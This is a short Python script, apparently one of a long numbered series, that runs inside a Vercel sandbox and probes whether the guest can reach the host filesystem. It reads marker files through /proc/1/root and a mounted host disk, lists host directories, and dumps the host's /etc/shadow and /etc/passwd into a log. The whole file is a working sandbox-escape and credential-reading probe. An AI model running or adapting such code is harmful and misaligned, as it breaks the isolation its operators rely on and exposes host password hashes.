# -*- coding: utf-8 -*-
"""v188 阶段B: guest 宿主视角全面检查 ExecCommand 特征文件"""
import socket, time, json, os, signal

OUT = '/vercel/sandbox/v188c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


log('=== 1 host tmp ===')
# 宿主真实路径: /proc/1/root = 宿主rootfs (celld root), /mnt/g/mnt/h = 宿主盘挂载
checks = ['/proc/1/root/tmp/out188.txt', '/proc/1/root/tmp/v188rm_host2.txt',
          '/proc/1/root/vercel/sandbox/out188.txt', '/proc/1/root/root/out188.txt',
          '/proc/1/root/tmp/v188rm_host.txt',
          '/mnt/g/mnt/h/tmp/out188.txt', '/mnt/g/mnt/h/tmp/v188rm_host2.txt',
          '/mnt/g/tmp/out188.txt', '/mnt/g/vercel/sandbox/out188.txt', '/mnt/g/root/out188.txt']
for p in checks:
    try:
        d = open(p, 'rb').read()
        log('H %s (%d): %r' % (p, len(d), d[:1500]))
    except Exception as e:
        log('H %s EXC %s' % (p, e))

log('=== 2 host rootfs listing ===')
for p in ['/proc/1/root/tmp', '/proc/1/root/root', '/proc/1/root/vercel']:
    try:
        items = sorted(os.listdir(p))[:30]
        log('LS %s: %s' % (p, items))
    except Exception as e:
        log('LS %s EXC %s' % (p, e))

log('=== 3 integrity ===')
for p in ['/proc/1/root/etc/shadow', '/proc/1/root/etc/passwd', '/proc/1/root/etc/hostname']:
    try:
        d = open(p, 'rb').read()
        log('I %s (%d) %r' % (p, len(d), d[:80]))
    except Exception as e:
        log('I %s EXC %s' % (p, e))

log('V188_DONE')
f.close()
